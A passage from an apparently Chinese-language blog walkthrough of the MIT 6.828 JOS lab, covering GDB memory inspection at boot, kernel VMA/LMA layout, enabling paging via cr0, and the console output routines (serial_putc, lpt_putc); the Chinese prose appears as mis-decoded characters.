need to use QEMU to answer this question. Just think.)</p></blockquote><p>è™½ç„¶è¦æ±‚åªçœ‹ 8 ä¸ª wordï¼Œä½†æ˜¯ç¬”è€…è¿˜æ˜¯ä¹ æƒ¯å¤šçœ‹ä¸€äº›ï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨åˆšåˆšè¿è¡Œåˆ° MBR æ—¶è¯¥å¤„æ•°æ®éƒ½æ˜¯0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gdb">The target architecture is set to &quot;i8086&quot;.<br>[f000:fff0]    0xffff0:    ljmp   $0xf000,$0xe05b<br>0x0000fff0 in ?? ()<br>+ symbol-file obj/kern/kernel<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x0000000000000000    0x0000000000000000<br>0x100010:    0x0000000000000000    0x0000000000000000<br>0x100020:    0x0000000000000000    0x0000000000000000<br>0x100030:    0x0000000000000000    0x0000000000000000<br>0x100040:    0x0000000000000000    0x0000000000000000<br>0x100050:    0x0000000000000000    0x0000000000000000<br>0x100060:    0x0000000000000000    0x0000000000000000<br>0x100070:    0x0000000000000000    0x0000000000000000<br>0x100080:    0x0000000000000000    0x0000000000000000<br>0x100090:    0x0000000000000000    0x0000000000000000<br>(gdb) b *0x7c00<br>Breakpoint 1 at 0x7c00<br>(gdb) c<br>Continuing.<br>[   0:7c00] =&gt; 0x7c00:    cli    <br><br>Breakpoint 1, 0x00007c00 in ?? ()<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x0000000000000000    0x0000000000000000<br>0x100010:    0x0000000000000000    0x0000000000000000<br>0x100020:    0x0000000000000000    0x0000000000000000<br>0x100030:    0x0000000000000000    0x0000000000000000<br>0x100040:    0x0000000000000000    0x0000000000000000<br>0x100050:    0x0000000000000000    0x0000000000000000<br>0x100060:    0x0000000000000000    0x0000000000000000<br>0x100070:    0x0000000000000000    0x0000000000000000<br>0x100080:    0x0000000000000000    0x0000000000000000<br>0x100090:    0x0000000000000000    0x0000000000000000<br>(gdb) <br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åœ¨è¿›å…¥å†…æ ¸æ—¶å†æ¬¡æŸ¥çœ‹æ­¤å¤„æ•°æ®ï¼Œå‘ç°å·²ç»è¢«è¦†ç›–ä¸Šäº†æ–°çš„æ•°æ®ï¼Œä¸»è¦æ˜¯å†…æ ¸çš„æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gdb">Breakpoint 1, 0x00007d81 in ?? ()<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x000000001badb002    0x7205c766e4524ffe<br>0x100010:    0x2000b81234000004    0xc0200fd8220f0011<br>0x100020:    0xc0220f800100010d    0xbde0fff010002fb8<br>0x100030:    0x110000bc00000000    0xfeeb0000006ce8f0<br>0x100040:    0x56e58955fb1e0ff3    0xc3810000017ee853<br>0x100050:    0x8308758b000112ba    0xff0778838d5608ec<br>0x100060:    0x8300000a03e850ff    0xec83297ef68510c4<br>0x100070:    0xffc6e850ff468d0c    0x08ec8310c483ffff<br>0x100080:    0x50ffff0794838d56    0x10c483000009dde8<br>0x100090:    0x83c35d5e5bf8658d    0x006a006a006a04ec<br>(gdb) <br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°ä¸€ä¸ªæ•°å­—<code>0x1badb002</code>â€”â€”<strong>è¿™æ˜¯ Multiboot Specification æ ‡å‡†è¦æ±‚çš„ä¸€ä¸ªä½äº header çš„ magic number</strong>ï¼Œåœ¨å¯åŠ¨æ—¶ä¼šæ ¡éªŒè¿™ä¸ªæ•°ï¼Œè¯¦æƒ…å¯ä»¥å‚è§ <a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">https://www.gnu.org/software/grub/manual/multiboot/multiboot.html</a></p><h2 id="Part-3-The-Kernel">Part 3: The Kernel</h2><p>åœ¨æœ¬éƒ¨åˆ†ä¸­æˆ‘ä»¬å°†å¼€å§‹å­¦ä¹  JOS çš„æœ€å°å®ç°çš„ç»†èŠ‚ï¼Œå¹¶<strong>å¼€å§‹å†™ä¸€äº›ä»£ç </strong>ã€‚å¦‚åŒ boot loader ä¸€èˆ¬ï¼Œå†…æ ¸åœ¨ä¸€å¼€å§‹ä¹Ÿå…ˆæ‰§è¡Œä¸€äº›æ±‡ç¼–ä»£ç ï¼Œä»¥è®© C ä»£ç èƒ½æ°å½“åœ°æ‰§è¡Œ</p><h3 id="Using-virtual-memory-to-work-around-position-dependence">Using virtual memory to work around position dependence</h3><p>MBR çš„é“¾æ¥åœ°å€äºåŠ è½½åœ°å€å®Œå…¨åŒ¹é…ï¼Œå› ä¸ºå…¶è¿è¡Œåœ¨å®æ¨¡å¼ä¸‹ï¼Œ<s>ä»–çš„ä¸€åˆ‡éƒ½å¾ˆçœŸï¼å®æ¨¡å¼ä¸»æ‰“çš„å°±æ˜¯çœŸå®ï¼</s>ï¼Œä½†å†…æ ¸çš„åŠ è½½åœ°å€ä¸é“¾æ¥åœ°å€å´å­˜åœ¨<strong>ç›¸å½“å¤§çš„å·®åˆ«ï¼ŒOS æ›´å€¾å‘äºè¢«é“¾æ¥åˆ°ä¸€ä¸ªæ›´é«˜çš„è™šæ‹Ÿåœ°å€ä¸Šè¿è¡Œï¼Œä½†å…¶å®é™…åˆ™ä½äºç‰©ç†ä½åœ°å€</strong></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>objdump</code> æŸ¥çœ‹ç¼–è¯‘å‡ºçš„å†…æ ¸ ELF æ–‡ä»¶æ¥éªŒè¯è¿™ä¸ªç»“è®ºï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -h ./obj/kern/kernel</span><br><br>./obj/kern/kernel:     file format elf32-i386<br><br>Sections:<br>Idx Name          Size      VMA       LMA       File off  Algn<br>  0 .text         00001a7f  f0100000  00100000  00001000  2**4<br>                  CONTENTS, ALLOC, LOAD, READONLY, CODE<br>  1 .rodata       000006bc  f0101a80  00101a80  00002a80  2**5<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  2 .stab         00004219  f010213c  0010213c  0000313c  2**2<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  3 .stabstr      0000198a  f0106355  00106355  00007355  2**0<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  4 .data         00009300  f0108000  00108000  00009000  2**12<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  5 .got          00000008  f0111300  00111300  00012300  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  6 .got.plt      0000000c  f0111308  00111308  00012308  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  7 .data.rel.local 00001000  f0112000  00112000  00013000  2**12<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  8 .data.rel.ro.local 00000044  f0113000  00113000  00014000  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  9 .bss          00000648  f0113060  00113060  00014060  2**5<br>                  CONTENTS, ALLOC, LOAD, DATA<br> 10 .comment      00000023  00000000  00000000  000146a8  2**0<br>                  CONTENTS, READONLY<br></code></pre></td></tr></table></figure><p>VMA ä¸ºè™šæ‹Ÿåœ°å€ï¼ŒLMA ä¸ºåŠ è½½åœ°å€ï¼Œå¯è§ç¡®å®å¦‚æ­¤ã€‚è¿™æ˜¯å› ä¸ºå½“ OS kernel è¢«è¿è¡Œåœ¨è¾ƒé«˜çš„è™šæ‹Ÿåœ°å€æ—¶ï¼Œå…¶å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°†è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä½åœ°å€éƒ¨åˆ†ç•™ç»™ç”¨æˆ·ç¨‹åºä½¿ç”¨ï¼Œ<strong>ä½†é€šå¸¸å¤§éƒ¨åˆ† 32 ä½æœºå™¨å¹¶æ²¡æœ‰è¶³å¤Ÿå¤§çš„å†…å­˜ï¼Œä»–ä»¬åœ¨ 0xf0100000 å¤„å¾€å¾€æ²¡æœ‰ä»»ä½•ç‰©ç†å†…å­˜</strong>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å®ç°<strong>è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„</strong>ï¼Œè¿™éœ€è¦å€ŸåŠ©é¡µè¡¨çš„å¸®åŠ©ã€‚</p><p>åœ¨è®¾ç½® cr0 å¯„å­˜å™¨çš„ <code>PG</code> æ ‡å¿—ä½å‰ï¼Œæˆ‘ä»¬çš„å†…å­˜ç®¡ç†æ¨¡å¼æ˜¯<strong>åˆ†æ®µ</strong>æ¨¡å¼ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹å†…å­˜çš„è®¿é—®ä½¿ç”¨çš„æ˜¯<strong>çº¿æ€§åœ°å€</strong>ï¼ˆlinear addressï¼‰â€”â€”ç”±æ®µé€‰æ‹©å­ä¸æ®µæè¿°ç¬¦è¡¨æ¥æè¿°åˆ†æ®µï¼Œå®Œæˆçº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„ï¼›åœ¨è®¾ç½®äº† cr0 å¯„å­˜å™¨çš„ <code>PG</code> æ ‡å¿—ä½ä¹‹åï¼Œæˆ‘ä»¬å¯¹å†…å­˜è®¿é—®ä½¿ç”¨çš„å°±æ˜¯<strong>è™šæ‹Ÿåœ°å€</strong>ï¼ˆvirtualï¼‰â€”â€”ç”±é¡µè¡¨æè¿°è™šæ‹Ÿåœ°å€ç©ºé—´åˆ°ç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œå¹¶ç”± MMU å®Œæˆç¿»è¯‘</p><p>32ä½ä¸‹æœ€å¸¸ç”¨çš„æ˜¯äºŒçº§é¡µè¡¨ï¼Œ6.828 ååˆ†è´´å¿ƒåœ°åœ¨ <code>kern/entrypgdir.c</code> ä¸­æ‰‹å†™äº†ä¸€ä¸ªé™æ€åˆå§‹åŒ–çš„é¡µè¡¨ç»“æ„ï¼Œè®¾ç½®äº†è™šæ‹Ÿåœ°å€ <code>0xf0000000 ~ 0xf0400000</code> åˆ°ç‰©ç†åœ°å€ <code>0x00000000 ~ 0x00400000</code> æ˜ å°„ï¼Œä»¥åŠè™šæ‹Ÿåœ°å€ <code>0x00000000 ~ 0x00400000</code> åˆ°ç‰©ç†åœ°å€ <code>0x00000000 ~ 0x00400000</code> æ˜ å°„ã€‚</p><p>è‹¥æˆ‘ä»¬å°è¯•è®¿é—®ä¸å±äºè¿™ä¸¤ä¸ªåœ°å€èŒƒå›´çš„åœ°å€ï¼Œåˆ™ä¼šè§¦å‘ç¼ºé¡µä¸­æ–­ï¼Œç”±äºæˆ‘ä»¬å°šæœªè®¾ç½®å¯¹åº”çš„ä¸­æ–­å¤„ç†ç¨‹åºï¼Œå› æ­¤ä¼šå¯¼è‡´ QEMU crash å¹¶é€€å‡º</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 7ï¼ŒæŸ¥çœ‹åˆ†é¡µæœºåˆ¶å¼€å¯å‰å <code>0x00100000</code> ä¸ <code>0xf0100000</code> è¿™ä¸¤ä¸ªåœ°å€ä¸Šçš„æ•°æ®</p><blockquote><p>Exercise 7.Â Use QEMU and GDB to trace into the JOS kernel and stop at the <code>movl %eax, %cr0</code>. Examine memory at 0x00100000 and at 0xf0100000. Now, single step over that instruction using theÂ stepiÂ GDB command. Again, examine memory at 0x00100000 and at 0xf0100000. Make sure you understand what just happened.</p><p>What is the first instruction <em>after</em> the new mapping is established that would fail to work properly if the mapping werenâ€™t in place? Comment out the <code>movl %eax, %cr0</code> inÂ kern/entry.S, trace into it, and see if you were right.</p></blockquote><p>ç»“æœå¦‚ä¸‹ï¼Œåœ¨æˆåŠŸå»ºç«‹é¡µè¡¨æ˜ å°„ä¹‹åè¿™ä¸¤ä¸ªåœ°å€çš„æ•°æ®æ˜¯ä¸€è‡´çš„ï¼Œå› ä¸º<strong>å®Œæˆæ˜ å°„åè¿™ä¸¤ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´æŒ‡å‘åŒä¸€ç‰©ç†åœ°å€ç©ºé—´</strong>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) <br>=&gt; 0x10001d:    mov    %cr0,%eax<br>0x0010001d in ?? ()<br>(gdb) si<br>=&gt; 0x100020:    or     $0x80010001,%eax<br>0x00100020 in ?? ()<br>(gdb) x /8x 0x00100000<br>0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) x /8x 0xf0100000<br>0xf0100000 &lt;_start-268435468&gt;:    0x00000000    0x00000000    0x00000000    0x00000000<br>0xf0100010 &lt;entry+4&gt;:    0x00000000    0x00000000    0x00000000    0x00000000<br>(gdb) si<br>=&gt; 0x100025:    mov    %eax,%cr0<br>0x00100025 in ?? ()<br>(gdb) <br>=&gt; 0x100028:    mov    $0xf010002f,%eax<br>0x00100028 in ?? ()<br>(gdb) x /8x 0x00100000<br>0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) x /8x 0xf0100000<br>0xf0100000 &lt;_start-268435468&gt;:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0xf0100010 &lt;entry+4&gt;:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) <br></code></pre></td></tr></table></figure><h3 id="Formatted-Printing-to-the-Console">Formatted Printing to the Console</h3><p>è¿™éƒ¨åˆ†è¦æ±‚æˆ‘ä»¬é˜…è¯» <code>kern/printf.c, lib/printfmt.c, kern/console.c</code> ä»¥äº†è§£ xv6 å‘æ§åˆ¶å°è¾“å‡ºå­—ç¬¦çš„å®ç°ã€‚åœ¨æ­£å¼å¼€å§‹é˜…è¯»ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè‡ªè¡Œæ€è€ƒä¸€ä¸‹ï¼šå¦‚ä½•åœ¨ä¸€å— 80 * 24 çš„å±å¹•ä¸Šå®ç°å„ç§å„æ ·çš„è¾“å‡ºåŠŸèƒ½ï¼Ÿ</p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œæ‰€æœ‰çš„è¾“å‡ºæ“ä½œæœ€ç»ˆéƒ½å¯ä»¥é€šè¿‡ä½¿ç”¨ä¸€ä¸ªâ€œè¾“å‡ºåŸè¯­â€å®ç°â€”â€”ã€Œè¾“å‡ºå•ä¸ªå­—ç¬¦ã€ï¼Œæˆ‘ä»¬åœ¨å®ç°å…¶ä»–çš„è¾“å‡ºåŠŸèƒ½ï¼Œä¾‹å¦‚ printf æˆ–æ˜¯ puts æ—¶ï¼Œåªéœ€è¦åœ¨è¿™äº›å‡½æ•°å†…éƒ¨å¤šæ¬¡è°ƒç”¨è¿™ä¸ªè¾“å‡ºåŸè¯­å³å¯ã€‚</p><p>è¿™ä¸ªè¾“å‡ºåŸè¯­åº”å½“å®Œæˆå¦‚ä¸‹åŠŸèƒ½ï¼š</p><ul><li><p>åœ¨å±å¹•å…‰æ ‡å¤„è¾“å‡ºå­—ç¬¦ï¼Œå¹¶é€‚å½“ç§»åŠ¨å…‰æ ‡ï¼ˆä¾‹å¦‚æ™®é€šå­—ç¬¦åˆ™å°†å…‰æ ‡å‘åç§»åŠ¨ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ <code>\b</code> åˆ™å°†å…‰æ ‡å‘å‰ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦ï¼Œ <code>\n</code> åˆ™å°†å…‰æ ‡ç§»åˆ°ä¸‹ä¸€è¡Œï¼‰</p></li><li><p>æ§åˆ¶è¾“å‡ºå­—ç¬¦çš„é¢œè‰²</p></li><li><p>å®ŒæˆåŸºç¡€çš„æ¢è¡ŒåŠŸèƒ½ï¼Œå½“å±å¹•è¢«å­—ç¬¦å¡«å……æ»¡æ—¶è¿›è¡Œæ»šå±</p></li></ul><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œåœ¨ BIOS æ—¶æœŸ<strong>æœ‰ä¸€éƒ¨åˆ†æ˜¾å­˜è¢«æ˜ å°„åˆ°å†…å­˜å½“ä¸­ï¼Œå…¶å®æˆ‘ä»¬åªéœ€è¦ç›´æ¥å¾€æ˜¾å­˜ä¸Šå†™å…¥æ•°æ®å³å¯æ§åˆ¶å±å¹•è¾“å‡º</strong>ï¼Œå› æ­¤æœ€ç»ˆæ¶‰åŠåˆ°ä¸æ˜¾å¡äº¤äº’çš„å…¶å®åªæœ‰å…‰æ ‡</p><p><code>0xB800~0xBFFF</code> è¿™å—åŒºåŸŸæ˜¯ä¾›æ–‡æœ¬æ¨¡å¼ä½¿ç”¨çš„æ˜¾å­˜ï¼Œå½“æˆ‘ä»¬åœ¨æ˜¾å­˜å†…çš„ç›¸åº”ä½ç½®å†™å…¥æ•°æ®æ—¶ï¼Œå±å¹•ä¸Šå°±ä¼šå‡ºç°å¯¹åº”çš„å­—ç¬¦ï¼Œåœ¨æ–‡æœ¬æ¨¡å¼ä¸‹æ˜¾ç¤ºå™¨æ”¯æŒ <code>80 x 25</code> 16 è‰²æ–‡æœ¬æ˜¾ç¤ºçš„çª—å£ï¼Œä¸€ä¸ªå­—ç¬¦å ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼š<strong>ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º ASCII ç ï¼Œç¬¬äºŒä¸ªå­—èŠ‚ä¸ºé¢œè‰²ä¿¡æ¯</strong></p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹ xv6 çš„æºç ï¼Œå…¶ä½¿ç”¨ä¸€ä¸ª <code>cons_putc()</code> å‡½æ•°å®ç°äº†è¿™ä¸ªå­—ç¬¦è¾“å‡ºåŸè¯­ï¼Œå®šä¹‰äº <code>kern/console.c</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// output a character to the console</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cons_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    serial_putc(c);<br>    lpt_putc(c);<br>    cga_putc(c);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°å…¶æœ€ç»ˆè°ƒç”¨ä¸‰ä¸ªå‡½æ•°ï¼š<code>serial_putc()</code>ã€<code>lpt_putc()</code>ã€<code>cga_putc()</code>ï¼Œå’‹ä¸€çœ‹æœ‰äº›ä¸€å¤´é›¾æ°´ï¼Œçœ‹å‡½æ•°ååç¼€ä¼¼ä¹è¿™ä¸‰ä¸ªå‡½æ•°éƒ½æ˜¯ç”¨æ¥è¾“å‡ºå•ä¸ªå­—ç¬¦çš„ï¼Ÿ</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªå‡½æ•° <code>serial_putc()</code>ï¼Œå…¶ä¸­è°ƒç”¨äº† <code>inb()</code> å’Œ <code>outb()</code> ä¸¤ä¸ªå‡½æ•°ï¼Œè¿™æ˜¯ä¸¤ä¸ªå°è£…å¥½çš„ç”¨ä»¥æ“ä½œç«¯å£çš„å‡½æ•°ï¼Œå±•å¼€ä»¥åå…¶å®å°±æ˜¯å†…è”æ±‡ç¼–å†™çš„ <code>inb</code> å’Œ <code>outb</code> æŒ‡ä»¤ï¼Œå•ä½éƒ½æ˜¯å­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_TX        0    <span class="hljs-comment">// Out: Transmit buffer (DLAB=0)</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR        5    <span class="hljs-comment">// In:    Line Status Register</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_DATA    0x01    <span class="hljs-comment">//   Data available</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_TXRDY    0x20    <span class="hljs-comment">//   Transmit buffer avail</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_TSRE    0x40    <span class="hljs-comment">//   Transmitter off</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">serial_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;<br>         !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="hljs-number">12800</span>;<br>         i++)<br>        delay();<br><br>    outb(COM1 + COM_TX, c);<br>&#125;<br><br><span class="hljs-comment">// inc/x86.h</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint8_t</span><br><span class="hljs-title function_">inb</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> data;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;inb %w1,%0&quot;</span> : <span class="hljs-string">&quot;=a&quot;</span> (data) : <span class="hljs-string">&quot;d&quot;</span> (port))</span>;<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-comment">// inc/x86.h</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">outb</span><span class="hljs-params">(<span class="hljs-type">int</span> port, <span class="hljs-type">uint8_t</span> data)</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;outb %0,%w1&quot;</span> : : <span class="hljs-string">&quot;a&quot;</span> (data), <span class="hljs-string">&quot;d&quot;</span> (port))</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŸ¥é“å…¶ä¸»è¦åŠŸèƒ½å°±æ˜¯ä» <code>Line Status Register</code> ä¸­è¯»å–æ•°æ®ï¼Œè‹¥ä¸ä¸º <code>COM_LSR_TXRDY</code> åˆ™é‡è¯•ï¼ˆæœ€å¤š 12800æ¬¡ï¼‰ï¼Œå¦åˆ™è¯´æ˜ <code>Transmit buffer</code> å·²å°±ç»ªï¼Œä¹‹åä¾¿å‘ <code>Transmit buffer</code> ä¸­å†™å…¥æˆ‘ä»¬è¦è¾“å‡ºçš„å­—ç¬¦</p><p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ª delay å‡½æ•°ï¼Œä¸»è¦æ˜¯ç”±äºå†å²é—ç•™é—®é¢˜ä»è€Œéœ€è¦æ˜¾å¼åœ°ä» 0x84 ç«¯å£ä¸­è¯»å– 4 æ¬¡ 1 å­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Stupid I/O delay routine necessitated by historical PC design flaws</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">delay</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>serial_putc()</code> çš„åŠŸèƒ½å·²ç»æ˜äº†ï¼šæ£€æŸ¥å¯¹åº”ç«¯å£çŠ¶æ€ï¼Œå†™å…¥å­—ç¬¦ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>lpt_putc()</code>ï¼Œè¿˜æ˜¯ä»ä¸€ä¸ªå¥‡æ€ªçš„ç«¯å£è¯»å–æ•°æ®å¹¶æ£€æŸ¥ï¼Œä¹‹åå‘å¦å¤–ä¸¤ä¸ªç«¯å£å†™å…¥å¥‡æ€ªçš„æ•°æ®ï¼Œå› ä¸ºç¬”è€…ä¸æ˜¯ç¡¬ä»¶ç›¸å…³å¼€å‘è€…æ‰€ä»¥è¿™é‡Œå°±ä¸æ·±ç©¶äº†ï¼ˆç¬‘ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/***** Parallel port output code *****/</span><br><span class="hljs-comment">// For information on PC parallel port programming, see the class References</span><br><span class="hljs-comment">// page.</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">lpt_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; !(inb(<span class="hljs-number">0x378</span>+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x80</span>) &amp;&amp; i &lt; <span class="hljs-number">12800</span>; i++)<br>        delay();<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">0</span>, c);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>|<span class="hljs-number">0x04</span>|<span class="hljs-number">0x01</span>);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ 